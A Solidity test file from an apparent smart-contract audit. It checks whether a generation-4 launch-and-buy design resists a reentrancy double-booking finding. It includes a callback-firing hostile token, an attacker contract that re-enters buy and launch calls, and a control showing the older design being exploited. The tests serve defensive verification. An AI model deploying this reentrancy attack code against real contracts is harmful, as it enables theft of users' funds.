// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

/**
 * F1 AGAINST GENERATION 4 — is the parked `gen4-pons-fork` design already immune?
 *
 * F1 (`docs/doku/audit/2026-09-10-external/first-buy-delta-reentrancy.md`) is a property of
 * `DokuFactory._firstBuy` on the LIVE generation-3 factory: the FACTORY moves the creator's quote
 * asset into the curve and prices the launch's first buy on the balance delta it measured across
 * its own `transferFrom`. No curve function is on the stack for that transfer, so a quote asset
 * that calls the PAYER back — every ERC-777, by mandate — lets the payer re-enter
 * `curve.buyWithToken()` inside the window and have the inner buy booked twice.
 *
 * `gen4-pons-fork` is another engineer's parked WIP branch and NOTHING in it is touched here. It
 * also cannot be compiled into this tree: its `src/` is a different contract set with a different
 * import closure, and this branch's `src/` is generation 3. So the gen-4 path is reproduced below
 * as stand-ins, transcribed from the branch by `git show`. Every line that decides F1 — the
 * ORDER of the legs, WHICH amount is priced, and WHERE each `nonReentrant` sits — is verbatim;
 * only the parts F1 cannot move are stripped (fees, snipe tax, creator tax, buyback, graduation,
 * launch config validation, the V4 seed), so that any gap between what a curve HOLDS and what it
 * has BOOKED is the double-book and nothing else.
 *
 * Transcribed from, at `gen4-pons-fork`:
 *   contracts/src/DokuLaunchFactory.sol  — `launchToken` / `launchTokenFor` / `_launchToken`
 *   contracts/src/DokuLaunchAndBuy.sol   — `launchAndBuy` / `_refund`   (the first-buy analogue)
 *   contracts/src/DokuBondingCurve.sol   — `buy` / `_receiveQuote` / `_sendQuote` / `sell`
 *
 * WHAT THE BRANCH ACTUALLY DOES, established by reading it before writing any of this:
 *
 *   1. THE GEN-4 FACTORY HAS NO FIRST BUY. `launchToken`, `launchToken(+exemptions)` and
 *      `launchTokenFor` create the token and the curve and take the native launch fee. They never
 *      touch the quote asset. A grep for `firstBuy` over the branch returns nothing, and the whole
 *      branch has exactly six `safeTransferFrom` call sites (enumerated in the header of the
 *      `Gen4CurveTest` section below).
 *
 *   2. THE FIRST BUY LIVES IN A SEPARATE ROUTER, `DokuLaunchAndBuy`, and it does NOT price a
 *      delta. It pulls the DECLARED `quoteIn`, then hands the curve that same declared `quoteIn`.
 *      There is no `arrived` for a reentrant buy to inflate. The router is `nonReentrant` across
 *      both legs, and the pull happens BEFORE `launchTokenFor`, so the curve F1 would re-enter
 *      does not exist yet when the callback fires.
 *
 *   3. `_transferExact` — the helper the brief asked about — IS NOT ON THE BUY PATH. Its only
 *      call site is `_fundGraduationExecutor`, i.e. the graduation seed, and it is `safeTransfer`
 *      (push), not `safeTransferFrom` (pull). It is irrelevant to F1. Traced, not assumed.
 *
 *   4. THE ONLY DELTA-PRICED QUOTE PULL IN GENERATION 4 IS `DokuBondingCurve._receiveQuote`, and
 *      it is called only from `buy`, which is `nonReentrant`. That is structurally the "guarded
 *      pull" (candidate B) that `Gen4FirstBuyFix.t.sol` proves is immune, and it is the same shape
 *      that already makes generation 3's `BondingCurve._pullAndBuy` immune.
 *
 * The tests below do not assert any of that by reading it. They build the attack.
 *
 * `CallbackQuote` and `ITokensToSend` are imported from `Gen4FirstBuyFix.t.sol` so this file and
 * that one are attacked by the SAME token, bit for bit. `HostileQuote` extends it with one
 * strictly stronger property that ERC-777 does not have and a bespoke hostile token would: a
 * notification to an address of the attacker's choosing on EVERY `transferFrom`, whoever the payer
 * is. That is what lets the callback be aimed at the curve's own inbound leg, where the payer is
 * the router rather than the attacker.
 *
 * CONTROL. A green solvency assertion proves nothing on its own, so `Gen3ControlFactory` runs
 * generation 3's shape — the factory-mediated, delta-priced push — against these SAME stand-ins
 * and the SAME token. It is insolvent by exactly the reentrant amount. That is the harness biting.
 *
 * No warping here, so no clock is read; `vm.getBlockTimestamp()` would be required if that changed
 * (`via_ir = true` folds `block.timestamp` past a warp).
 */

import {Test} from "forge-std/Test.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {ReentrancyGuard} from "openzeppelin/utils/ReentrancyGuard.sol";
import {Clones} from "openzeppelin/proxy/Clones.sol";
import {Math} from "openzeppelin/utils/math/Math.sol";

import {ITokensToSend} from "./Gen4FirstBuyFix.t.sol";

// =============================================================================================
//                                   THE QUOTE ASSET, SHARPENED
// =============================================================================================

/**
 * @dev `CallbackQuote` from `Gen4FirstBuyFix.t.sol`, TRANSCRIBED (that file's `transferFrom` is not
 *      `virtual`, and this audit may not edit it), plus one strictly stronger property: a
 *      `watcher` notified on EVERY `transferFrom`, regardless of who the payer is.
 *
 *      Fields 1 and 2 are that file's, unchanged and used the same way — an opt-in sender
 *      callback (ERC-777 §tokensToSend: the payer opts ITSELF in, so the hostile party is the
 *      payer and not the token) and an optional transfer fee.
 *
 *      The watcher is the addition, and it is needed rather than gratuitous: on the gen-4 router
 *      path the payer of the CURVE's inbound leg is the ROUTER, not the attacker, so a
 *      sender-only notification can never hand the attacker control inside `_receiveQuote`.
 *      Without it, "the curve's guarded pull is immune" would be an accident of the fixture
 *      instead of a property of the code. ERC-777 does not do this; a bespoke hostile token can.
 */
contract HostileQuote is ERC20 {
    mapping(address => bool) public senderHook;
    uint16 public feeBps;
    address public feeSink;
    bool public swallowHookReverts;
    uint256 public hookCalls;

    address public watcher;
    bool public swallowWatcherReverts;
    uint256 public watcherCalls;

    constructor() ERC20("Callback Quote", "CBQ") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setSenderHook(bool on) external {
        senderHook[msg.sender] = on;
    }

    function setFee(uint16 bps, address sink) external {
        feeBps = bps;
        feeSink = sink;
    }

    function setSwallowHookReverts(bool on) external {
        swallowHookReverts = on;
    }

    function setWatcher(address who, bool swallow) external {
        watcher = who;
        swallowWatcherReverts = swallow;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address w = watcher;
        if (w != address(0)) {
            ++watcherCalls;
            if (swallowWatcherReverts) {
                try ITokensToSend(w).tokensToSend(from, to, amount) {} catch {}
            } else {
                ITokensToSend(w).tokensToSend(from, to, amount);
            }
        }
        if (senderHook[from]) {
            ++hookCalls;
            if (swallowHookReverts) {
                try ITokensToSend(from).tokensToSend(from, to, amount) {} catch {}
            } else {
                ITokensToSend(from).tokensToSend(from, to, amount);
            }
        }
        return super.transferFrom(from, to, amount);
    }

    function _update(address from, address to, uint256 value) internal override {
        uint256 fee;
        if (from != address(0) && to != address(0) && feeBps != 0 && feeSink != address(0) && to != feeSink) {
            fee = (value * feeBps) / 10_000;
        }
        if (fee == 0) {
            super._update(from, to, value);
        } else {
            super._update(from, feeSink, fee);
            super._update(from, to, value - fee);
        }
    }
}

// =============================================================================================
//                        THE GENERATION-4 PATH, TRANSCRIBED FROM THE BRANCH
// =============================================================================================

contract G4Token is ERC20 {
    constructor(address curve, uint256 supply) ERC20("Gen4", "G4") {
        _mint(curve, supply);
    }
}

/**
 * @dev `DokuBondingCurve`, reduced to the inbound accounting F1 can move.
 *
 *      KEPT VERBATIM: `_receiveQuote`'s balance delta; that `buy` is `nonReentrant`; that
 *      `_receiveQuote` is called from INSIDE it, as the first statement; that `buy` is priced on
 *      `received` and not on the caller's `quoteIn`; the `reservedTokens` clamp and the refund of
 *      `received - spent` to `msg.sender`; the price-not-quantity slippage bound; `sell` being
 *      `nonReentrant` too.
 *
 *      STRIPPED: `feeBps`, `creatorTaxBps`, the snipe tax, `quoteFeeBalance` / `creatorTaxBalance`,
 *      the buyback, graduation. With those gone `trackedQuote` is the curve's ENTIRE quote
 *      liability, so `solvency()` is exact and any non-zero value is the bug.
 *
 *      ADDED, and NOT part of generation 4: `buyForPush`, which exists only so `Gen3ControlFactory`
 *      can run generation 3's shape against this same fixture as the control.
 */
contract G4Curve is ReentrancyGuard {
    using SafeERC20 for IERC20;

    error NotFactory();
    error ZeroAmount();
    error ZeroAddress();
    error SlippageExceeded(uint256 got, uint256 want);
    error CurveGraduated();
    error InvalidLaunchEconomics();

    address public factory;
    IERC20 public token;
    IERC20 public quote;

    uint256 public phantomQuote;
    uint256 public graduationThreshold;
    uint256 public trackedQuote;
    uint256 public trackedTokens;
    uint256 public reservedTokens;

    bool private _initialised;

    constructor() {
        _initialised = true;
    }

    function initialize(address token_, address quote_, uint256 phantomQuote_, uint256 graduationThreshold_)
        external
    {
        if (_initialised) revert NotFactory();
        _initialised = true;
        factory = msg.sender;
        token = IERC20(token_);
        quote = IERC20(quote_);
        phantomQuote = phantomQuote_;
        graduationThreshold = graduationThreshold_;

        uint256 supply = IERC20(token_).balanceOf(address(this));
        uint256 reserved = Math.mulDiv(supply, phantomQuote_, phantomQuote_ + graduationThreshold_);
        if (reserved == 0 || reserved >= supply) revert InvalidLaunchEconomics();
        reservedTokens = reserved;
        trackedTokens = supply;
    }

    /// @notice What the curve HOLDS minus what it has BOOKED. Zero is exact; negative is the bug.
    function solvency() external view returns (int256) {
        return int256(quote.balanceOf(address(this))) - int256(trackedQuote);
    }

    function sellableTokens() public view returns (uint256) {
        return trackedTokens > reservedTokens ? trackedTokens - reservedTokens : 0;
    }

    // -------------------------------------------------------------- generation 4's inbound leg

    /// @dev `DokuBondingCurve.buy`. The pull is the FIRST statement and it is inside this guard.
    function buy(uint256 quoteIn, uint256 minTokensOut, address recipient)
        external
        payable
        nonReentrant
        returns (uint256 tokensOut)
    {
        if (recipient == address(0)) revert ZeroAddress();

        uint256 received = _receiveQuote(quoteIn);
        if (received == 0) revert ZeroAmount();

        uint256 quoteReserveBefore = phantomQuote + trackedQuote;
        uint256 tokenReserveBefore = trackedTokens;

        uint256 spent = received;
        tokensOut = Math.mulDiv(tokenReserveBefore, spent, quoteReserveBefore + spent);

        uint256 sellable = tokenReserveBefore > reservedTokens ? tokenReserveBefore - reservedTokens : 0;
        if (sellable == 0) revert CurveGraduated();

        if (tokensOut > sellable) {
            tokensOut = sellable;
            uint256 net =
                Math.mulDiv(quoteReserveBefore, sellable, tokenReserveBefore - sellable, Math.Rounding.Ceil);
            spent = Math.min(net, received);
        }

        if (spent * minTokensOut > received * tokensOut) revert SlippageExceeded(tokensOut, minTokensOut);

        trackedQuote += spent;
        trackedTokens -= tokensOut;
        token.safeTransfer(recipient, tokensOut);

        uint256 refund = received - spent;
        if (refund != 0) _sendQuote(msg.sender, refund);
    }

    /// @dev `DokuBondingCurve.sell`, fees stripped. Present so an exit can be attempted.
    function sell(uint256 tokensIn, uint256 minQuoteOut, address recipient)
        external
        nonReentrant
        returns (uint256 quoteOut)
    {
        if (recipient == address(0)) revert ZeroAddress();
        token.safeTransferFrom(msg.sender, address(this), tokensIn);

        uint256 quoteReserveBefore = phantomQuote + trackedQuote;
        quoteOut = Math.mulDiv(quoteReserveBefore, tokensIn, trackedTokens + tokensIn);
        if (quoteOut < minQuoteOut) revert SlippageExceeded(quoteOut, minQuoteOut);

        trackedQuote -= quoteOut;
        trackedTokens += tokensIn;
        _sendQuote(recipient, quoteOut);
    }

    /// @dev `DokuBondingCurve._receiveQuote`, VERBATIM. The delta is measured here, and every
    ///      caller of it is inside this contract's own `nonReentrant`.
    function _receiveQuote(uint256 amount) private returns (uint256) {
        uint256 balanceBefore = quote.balanceOf(address(this));
        quote.safeTransferFrom(msg.sender, address(this), amount);
        return quote.balanceOf(address(this)) - balanceBefore;
    }

    function _sendQuote(address recipient, uint256 amount) private {
        quote.safeTransfer(recipient, amount);
    }

    // ------------------------------------------------- NOT generation 4: the gen-3 control only

    /// @dev Generation 3's `BondingCurve.buyFor`: the money has ALREADY been moved by the factory
    ///      and this call is asked to trust the amount the factory measured. Used by
    ///      `Gen3ControlFactory` and by nothing else in this file.
    function buyForPush(address recipient, uint256 quoteIn, uint256 minTokensOut)
        external
        nonReentrant
        returns (uint256 tokensOut)
    {
        if (msg.sender != factory) revert NotFactory();
        if (quoteIn == 0) revert ZeroAmount();

        uint256 quoteReserveBefore = phantomQuote + trackedQuote;
        uint256 tokenReserveBefore = trackedTokens;
        tokensOut = Math.mulDiv(tokenReserveBefore, quoteIn, quoteReserveBefore + quoteIn);
        if (tokensOut < minTokensOut) revert SlippageExceeded(tokensOut, minTokensOut);

        trackedQuote += quoteIn;
        trackedTokens -= tokensOut;
        token.safeTransfer(recipient, tokensOut);
    }
}

/**
 * @dev `DokuLaunchFactory`, reduced to the launch path. What matters for F1 is what is ABSENT:
 *      no `firstBuy` parameter, no quote-asset transfer of any kind, no balance read on a quote
 *      asset. `launchTokenFor` is gated to the `launchForwarder` and namespaces the CREATE2 salt
 *      by the INITIATING account, both as on the branch.
 */
contract G4Factory {
    error NotLaunchForwarder();

    struct TokenParams {
        string name;
        string symbol;
        address creatorFeeRecipient;
    }

    address public immutable curveImplementation;
    address public launchForwarder;
    uint256 public immutable phantomQuote;
    uint256 public immutable graduationThreshold;
    uint256 public constant SUPPLY = 1_000_000_000e18;

    mapping(address => uint256) public nonces;

    constructor(uint256 phantomQuote_, uint256 graduationThreshold_) {
        phantomQuote = phantomQuote_;
        graduationThreshold = graduationThreshold_;
        curveImplementation = address(new G4Curve());
    }

    function setLaunchForwarder(address forwarder) external {
        launchForwarder = forwarder;
    }

    function canLaunch(address) public pure returns (bool) {
        return true;
    }

    function predictCurve(address deployer) external view returns (address) {
        bytes32 salt = keccak256(abi.encode(deployer, nonces[deployer]));
        return Clones.predictDeterministicAddress(curveImplementation, salt, address(this));
    }

    function launchToken(TokenParams calldata params, address pairToken)
        external
        payable
        returns (address token, address curve)
    {
        return _launchToken(params, pairToken, msg.sender);
    }

    /// @dev `DokuLaunchFactory.launchTokenFor`. Trusted-forwarder only; still moves no quote.
    function launchTokenFor(TokenParams calldata params, address pairToken, address originalDeployer)
        external
        payable
        returns (address token, address curve)
    {
        if (msg.sender != launchForwarder) revert NotLaunchForwarder();
        return _launchToken(params, pairToken, originalDeployer);
    }

    function _launchToken(TokenParams calldata, address pairToken, address originalDeployer)
        private
        returns (address token, address curve)
    {
        bytes32 salt = keccak256(abi.encode(originalDeployer, nonces[originalDeployer]++));
        curve = Clones.cloneDeterministic(curveImplementation, salt);
        token = address(new G4Token(curve, SUPPLY));
        G4Curve(payable(curve)).initialize(token, pairToken, phantomQuote, graduationThreshold);
    }
}

/**
 * @dev `DokuLaunchAndBuy.launchAndBuy`, ERC-20 quote branch, TRANSCRIBED IN ORDER. The native
 *      branch is omitted: it carries no `transferFrom` at all, so F1 has no analogue on it.
 *
 *      The four lines F1 turns on, and each is exactly as on the branch:
 *        1. `nonReentrant` on the whole function.
 *        2. `balanceBefore` read BEFORE the pull, used only to size the refund.
 *        3. the pull of the DECLARED `quoteIn` — and it happens BEFORE `launchTokenFor`.
 *        4. `curve.buy(quoteIn, ...)` — the DECLARED amount again. There is no `arrived` here.
 */
contract G4LaunchAndBuy is ReentrancyGuard {
    using SafeERC20 for IERC20;

    error ZeroAddress();
    error ZeroAmount();
    error NotApprovedLauncher();
    error RefundFailed();

    G4Factory public immutable factory;

    constructor(G4Factory factory_) {
        factory = factory_;
    }

    function launchAndBuy(
        G4Factory.TokenParams calldata params,
        address pairToken,
        uint256 quoteIn,
        uint256 minTokensOut,
        address recipient
    ) external payable nonReentrant returns (address token, address curve, uint256 tokensOut) {
        if (!factory.canLaunch(msg.sender)) revert NotApprovedLauncher();
        if (recipient == address(0)) revert ZeroAddress();
        if (params.creatorFeeRecipient == address(0)) revert ZeroAddress();
        if (quoteIn == 0) revert ZeroAmount();

        uint256 balanceBefore = IERC20(pairToken).balanceOf(address(this));

        IERC20(pairToken).safeTransferFrom(msg.sender, address(this), quoteIn);

        (token, curve) = factory.launchTokenFor(params, pairToken, msg.sender);

        IERC20(pairToken).forceApprove(curve, quoteIn);
        tokensOut = G4Curve(payable(curve)).buy(quoteIn, minTokensOut, recipient);
        IERC20(pairToken).forceApprove(curve, 0);

        _refund(pairToken, balanceBefore);
    }

    function _refund(address pairToken, uint256 balanceBefore) private {
        uint256 quoteRefund = IERC20(pairToken).balanceOf(address(this)) - balanceBefore;
        if (quoteRefund == 0) return;
        IERC20(pairToken).safeTransfer(msg.sender, quoteRefund);
    }

    receive() external payable {}
}

/**
 * @dev NOT generation 4. Generation 3's `DokuFactory._firstBuy`, verbatim, wired to the same
 *      stand-in curve and driven by the same token — the control that shows the harness bites.
 */
contract Gen3ControlFactory {
    using SafeERC20 for IERC20;

    error FirstBuyDeliveredNothing();

    address public immutable curveImplementation;
    uint256 public immutable phantomQuote;
    uint256 public immutable graduationThreshold;
    uint256 public constant SUPPLY = 1_000_000_000e18;
    mapping(address => uint256) public nonces;

    constructor(uint256 phantomQuote_, uint256 graduationThreshold_) {
        phantomQuote = phantomQuote_;
        graduationThreshold = graduationThreshold_;
        curveImplementation = address(new G4Curve());
    }

    function predictCurve(address deployer) external view returns (address) {
        bytes32 salt = keccak256(abi.encode(deployer, nonces[deployer]));
        return Clones.predictDeterministicAddress(curveImplementation, salt, address(this));
    }

    function launch(address quoteAsset, uint256 firstBuyQuote) external returns (address token, address curve) {
        bytes32 salt = keccak256(abi.encode(msg.sender, nonces[msg.sender]++));
        curve = Clones.cloneDeterministic(curveImplementation, salt);
        token = address(new G4Token(curve, SUPPLY));
        G4Curve(payable(curve)).initialize(token, quoteAsset, phantomQuote, graduationThreshold);
        if (firstBuyQuote != 0) _firstBuy(quoteAsset, curve, firstBuyQuote);
    }

    /// @dev `src/DokuFactory.sol` `_firstBuy`, the three lines of it that matter.
    function _firstBuy(address quoteAsset, address curve, uint256 firstBuyQuote) private {
        IERC20 q = IERC20(quoteAsset);
        uint256 before = q.balanceOf(curve);
        q.safeTransferFrom(msg.sender, curve, firstBuyQuote);
        uint256 arrived = q.balanceOf(curve) - before;
        if (arrived == 0) revert FirstBuyDeliveredNothing();
        G4Curve(payable(curve)).buyForPush(msg.sender, arrived, 0);
    }
}

// =============================================================================================
//                                        THE ATTACKER
// =============================================================================================

/**
 * @dev The launch creator. Hostile; the token is not required to be, beyond calling back.
 *
 *      Every re-entry is wrapped in try/catch and its outcome RECORDED rather than allowed to
 *      revert the outer call, because the interesting result is "the guard bounced it AND the
 *      launch still settled correctly" — a bare revert would prove only the first half. The
 *      recorded revert data is asserted against `ReentrancyGuardReentrantCall` where that is the
 *      claim.
 */
contract G4Attacker is ITokensToSend {
    enum Target {
        NONE,
        CURVE_BUY,
        ROUTER_LAUNCH
    }

    G4Factory public factory;
    G4LaunchAndBuy public router;
    Gen3ControlFactory public control;
    IERC20 public quote;

    address public curve;
    uint256 public inner;
    Target public target;
    bool public armed;
    bool public fired;

    // --- what the callback observed, read back by the tests
    bool public innerSucceeded;
    bytes public innerRevertData;
    uint256 public curveCodeSizeAtHook;
    uint256 public hookFires;
    /// @notice Set when the callback found its target curve had no code yet.
    bool public sawCodelessTarget;

    constructor(IERC20 quote_) {
        quote = quote_;
    }

    function setRouter(G4Factory f, G4LaunchAndBuy r) external {
        factory = f;
        router = r;
    }

    function setControl(Gen3ControlFactory c) external {
        control = c;
    }

    function arm(address curve_, uint256 inner_, Target target_) external {
        curve = curve_;
        inner = inner_;
        target = target_;
        armed = true;
        fired = false;
        innerSucceeded = false;
        innerRevertData = "";
        curveCodeSizeAtHook = type(uint256).max;
        sawCodelessTarget = false;
    }

    function disarm() external {
        armed = false;
        target = Target.NONE;
    }

    function approveAll(address spender) external {
        quote.approve(spender, type(uint256).max);
    }

    // ------------------------------------------------------------------------------ entry points

    function launchViaRouter(uint256 quoteIn, uint256 minOut)
        external
        returns (address token, address curveOut, uint256 tokensOut)
    {
        G4Factory.TokenParams memory p;
        p.name = "Hostile";
        p.symbol = "HOS";
        p.creatorFeeRecipient = address(this);
        return router.launchAndBuy(p, address(quote), quoteIn, minOut, address(this));
    }

    function launchViaControl(uint256 firstBuy) external returns (address token, address curveOut) {
        return control.launch(address(quote), firstBuy);
    }

    function directBuy(address curve_, uint256 amount, uint256 minOut) external returns (uint256) {
        return G4Curve(payable(curve_)).buy(amount, minOut, address(this));
    }

    function sellAll(address curve_, address token_) external returns (uint256) {
        uint256 bal = IERC20(token_).balanceOf(address(this));
        IERC20(token_).approve(curve_, bal);
        return G4Curve(payable(curve_)).sell(bal, 0, address(this));
    }

    // ----------------------------------------------------------------------------- the callback

    function tokensToSend(address, address, uint256) external override {
        if (!armed || fired || target == Target.NONE) return;
        ++hookFires;

        if (target == Target.CURVE_BUY) {
            address c = curve;
            uint256 size;
            assembly {
                size := extcodesize(c)
            }
            // A codeless target is recorded and the shot is NOT spent. Solidity's extcodesize
            // check on a high-level call is not catchable by try/catch, so calling here would
            // revert this whole frame — and the token swallows that, unwinding the very evidence
            // being recorded. The latch stays open so a later notification, on a live curve, still
            // gets its attempt.
            if (size == 0) {
                sawCodelessTarget = true;
                return;
            }
            fired = true;
            curveCodeSizeAtHook = size;
            try G4Curve(payable(c)).buy(inner, 0, address(this)) {
                innerSucceeded = true;
            } catch (bytes memory err) {
                innerRevertData = err;
            }
            return;
        }

        fired = true;
        G4Factory.TokenParams memory p;
        p.name = "Hostile2";
        p.symbol = "HOS2";
        p.creatorFeeRecipient = address(this);
        try router.launchAndBuy(p, address(quote), inner, 0, address(this)) {
            innerSucceeded = true;
        } catch (bytes memory err) {
            innerRevertData = err;
        }
    }
}

// =============================================================================================
//                                          THE TESTS
// =============================================================================================

contract Gen4ImmunityTest is Test {
    HostileQuote internal quote;
    G4Factory internal factory;
    G4LaunchAndBuy internal router;
    G4Attacker internal attacker;
    Gen3ControlFactory internal control;

    address internal constant FEESINK = address(0xFEE5);
    address internal constant BOB = address(0xB0B);

    uint256 internal constant PHANTOM = 3_200e6;
    uint256 internal constant THRESHOLD = 8_000e6;
    uint256 internal constant FIRST = 1_000e6;
    uint256 internal constant INNER = 1_000e6;
    uint16 internal constant FEE_BPS = 500; // 5%

    bytes4 internal constant REENTRANT = bytes4(keccak256("ReentrancyGuardReentrantCall()"));

    function setUp() public {
        quote = new HostileQuote();
        factory = new G4Factory(PHANTOM, THRESHOLD);
        router = new G4LaunchAndBuy(factory);
        factory.setLaunchForwarder(address(router));
        control = new Gen3ControlFactory(PHANTOM, THRESHOLD);

        attacker = new G4Attacker(IERC20(address(quote)));
        attacker.setRouter(factory, router);
        attacker.setControl(control);
        quote.mint(address(attacker), 1_000_000e6);
        quote.mint(BOB, 1_000_000e6);

        // The attacker opts ITSELF into the sender notification, exactly as an ERC-777 sender
        // registers itself with ERC-1820. The token is not the hostile party.
        vm.prank(address(attacker));
        quote.setSenderHook(true);
    }

    function _selector(bytes memory err) internal pure returns (bytes4 s) {
        if (err.length < 4) return bytes4(0);
        assembly {
            s := mload(add(err, 0x20))
        }
    }

    // -----------------------------------------------------------------------------------------
    //  1. THE FACTORY. F1's window is a factory-mediated quote transfer. Generation 4 has none.
    // -----------------------------------------------------------------------------------------

    /// @notice A gen-4 launch never touches the quote asset, so there is no window to open.
    function test_gen4_factoryLaunchMovesNoQuoteAndOpensNoWindow() public {
        // Armed to the hilt: the attacker's sender hook is live and a watcher is aimed at it too.
        quote.setWatcher(address(attacker), true);
        address predicted = factory.predictCurve(address(attacker));
        attacker.arm(predicted, INNER, G4Attacker.Target.CURVE_BUY);

        G4Factory.TokenParams memory p;
        p.name = "Plain";
        p.symbol = "PLN";
        p.creatorFeeRecipient = address(attacker);

        vm.prank(address(attacker));
        (, address curve) = factory.launchToken(p, address(quote));

        assertEq(quote.hookCalls(), 0, "sender notification fired during a launch");
        assertEq(quote.watcherCalls(), 0, "a transferFrom happened during a launch");
        assertEq(attacker.hookFires(), 0, "the attacker got control during a launch");
        assertEq(quote.balanceOf(address(factory)), 0, "the factory held quote");
        assertEq(quote.balanceOf(curve), 0, "the curve was funded by the factory");
        assertEq(G4Curve(payable(curve)).trackedQuote(), 0, "the curve booked quote at launch");
        assertEq(G4Curve(payable(curve)).solvency(), 0);
    }

    // -----------------------------------------------------------------------------------------
    //  2. THE ROUTER. The first-buy analogue: does the callback window reach anything?
    // -----------------------------------------------------------------------------------------

    /// @notice The router's pull happens BEFORE `launchTokenFor`, so the curve the attacker would
    ///         re-enter has no code yet. The window predates its own target.
    function test_gen4_routerPullWindowPredatesTheCurve() public {
        address predicted = factory.predictCurve(address(attacker));
        attacker.arm(predicted, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(address(router));

        (, address curve, uint256 tokensOut) = attacker.launchViaRouter(FIRST, 0);

        assertEq(curve, predicted, "the CREATE2 prediction was wrong; the attack was never aimed");
        assertEq(quote.hookCalls(), 1, "the attacker was never given control");
        assertEq(attacker.hookFires(), 1);
        assertTrue(attacker.sawCodelessTarget(), "the curve already existed during the router's pull");
        assertFalse(attacker.innerSucceeded(), "a buy landed on a curve that did not exist");
        assertGt(tokensOut, 0);

        G4Curve c = G4Curve(payable(curve));
        assertEq(c.solvency(), 0, "gen 4 over-booked the launch buy");
        assertEq(c.trackedQuote(), FIRST, "the curve booked something other than what was paid");
        assertEq(quote.balanceOf(address(router)), 0, "the router kept quote");
    }

    /// @notice Re-entering the router itself inside its own pull bounces off its guard, and the
    ///         outer launch still settles exactly.
    function test_gen4_reentrantLaunchAndBuyBouncesOffTheRouterGuard() public {
        attacker.arm(address(0), INNER, G4Attacker.Target.ROUTER_LAUNCH);
        attacker.approveAll(address(router));

        (, address curve,) = attacker.launchViaRouter(FIRST, 0);

        assertEq(attacker.hookFires(), 1);
        assertFalse(attacker.innerSucceeded(), "a second launch settled inside the first");
        assertEq(_selector(attacker.innerRevertData()), REENTRANT, "the router's guard did not bounce it");

        G4Curve c = G4Curve(payable(curve));
        assertEq(c.solvency(), 0);
        assertEq(c.trackedQuote(), FIRST);
    }

    // -----------------------------------------------------------------------------------------
    //  3. THE CURVE. The only delta-priced quote pull in generation 4, attacked directly.
    // -----------------------------------------------------------------------------------------

    /// @notice `_receiveQuote` measures a delta, but it does so inside `buy`'s own guard. This is
    ///         the F1 attack aimed at the exact line that measures, and it bounces.
    function test_gen4_reentrantBuyInsideTheCurvePullBouncesOffTheCurveGuard() public {
        address curve = _launchQuietly();
        G4Curve c = G4Curve(payable(curve));

        attacker.arm(curve, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(curve);
        attacker.directBuy(curve, FIRST, 0);

        assertEq(attacker.hookFires(), 1, "the attacker never got control inside the pull");
        assertGt(attacker.curveCodeSizeAtHook(), 0, "the curve was not live; the attack missed");
        assertFalse(attacker.innerSucceeded(), "the inner buy was booked");
        assertEq(_selector(attacker.innerRevertData()), REENTRANT, "the curve's guard did not bounce it");

        assertEq(c.trackedQuote(), FIRST, "the curve booked more than it was paid");
        assertEq(c.solvency(), 0);
    }

    /// @notice The same attack routed through `launchAndBuy`, with the callback aimed at the
    ///         CURVE's inbound leg rather than the router's. On that leg the payer is the router,
    ///         so this needs the strictly-stronger `watcher`; the curve's guard still bounces it.
    function test_gen4_watcherAimedAtTheCurvesOwnPullBouncesToo() public {
        address predicted = factory.predictCurve(address(attacker));
        attacker.arm(predicted, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(address(router));
        attacker.approveAll(predicted);
        // Notify the attacker on EVERY transferFrom, so the curve's own pull hands them control.
        quote.setWatcher(address(attacker), true);
        // Disarm the sender hook so the FIRST notification the attacker acts on is the curve's.
        vm.prank(address(attacker));
        quote.setSenderHook(false);

        (, address curve,) = attacker.launchViaRouter(FIRST, 0);
        G4Curve c = G4Curve(payable(curve));

        // Two notifications in one launch: the router's pull, then the curve's own.
        assertEq(quote.watcherCalls(), 2, "expected the router's pull and then the curve's");
        assertEq(attacker.hookFires(), 2);
        assertTrue(attacker.sawCodelessTarget(), "the router's pull already had a curve to hit");
        assertGt(attacker.curveCodeSizeAtHook(), 0, "the curve's own pull never handed over control");
        assertFalse(attacker.innerSucceeded(), "the inner buy was booked");
        assertEq(_selector(attacker.innerRevertData()), REENTRANT, "the curve's guard did not bounce it");
        assertEq(c.solvency(), 0);
        assertEq(c.trackedQuote(), FIRST);
    }

    // -----------------------------------------------------------------------------------------
    //  4. CALLBACK **AND** FEE-ON-TRANSFER — the combination that separates the designs.
    // -----------------------------------------------------------------------------------------

    /// @notice On a curve, the pair that leaves the clamp permanently short leaves gen 4 exact:
    ///         the guard stops the double-book and the delta absorbs the fee.
    function test_gen4_curve_callbackPlusFeeOnTransfer_staysExact() public {
        address curve = _launchQuietly();
        G4Curve c = G4Curve(payable(curve));
        quote.setFee(FEE_BPS, FEESINK);

        attacker.arm(curve, INNER, G4Attacker.Target.CURVE_BUY);
        attacker.approveAll(curve);
        attacker.directBuy(curve, FIRST, 0);

        assertFalse(attacker.innerSucceeded());
        assertEq(_selector(attacker.innerRevertData()), REENTRANT);
        // Only what actually arrived was booked.
        uint256 arrived = FIRST - (FIRST * FEE_BPS) / 10_000;
        assertEq(c.trackedQuote(), arrived, "gen 4 booked the nominal amount, not the delivered one");
        assertEq(c.solvency(), 0, "gen 4 leaked on a callback + fee-on-transfer quote");
    }

    /// @notice The ROUTER, by contrast, cannot transact a fee-on-transfer quote at all: it pulls
    ///         `quoteIn`, receives less, and then hands the curve the full `quoteIn` to pull from
    ///         it. It FAILS SAFE — the whole launch reverts, no market is created — but it is a
    ///         hard functional limit, not a solvency one. Recorded here, not as an F1 finding.
    function test_gen4_router_feeOnTransferQuoteRevertsTheWholeLaunch() public {
        quote.setFee(FEE_BPS, FEESINK);
        attacker.disarm();
        attacker.approveAll(address(router));

        uint256 marketsBefore = factory.nonces(address(attacker));
        vm.expectRevert();
        attacker.launchViaRouter(FIRST, 0);
        assertEq(factory.nonces(address(attacker)), marketsBefore, "a market survived the revert");
        assertEq(quote.balanceOf(address(router)), 0, "the router kept the creator's money");
    }

    // -----------------------------------------------------------------------------------------
